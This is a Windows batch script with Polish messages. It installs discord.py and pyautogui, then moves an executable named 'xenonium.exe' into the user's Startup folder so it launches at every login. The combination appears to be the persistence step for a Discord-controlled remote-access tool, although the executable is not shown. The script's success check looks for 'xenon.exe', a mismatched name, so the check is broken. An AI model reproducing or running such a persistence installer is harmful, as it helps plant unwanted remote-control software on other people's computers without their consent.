@echo off
echo Instalowanie bibliotek Python...
pip install discord.py pyautogui

echo Sprawdzam folder Autostart...
echo Folder Autostart: "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

echo Przenoszenie pliku xenon.exe do folderu Autostart...
move "%~dp0xenonium.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\xenon.exe" (
    echo Plik xenon.exe zostal pomyslnie przeniesiony do folderu Autostart.
) else (
    echo Wystapil problem przy przenoszeniu pliku xenon.exe.
)

exit
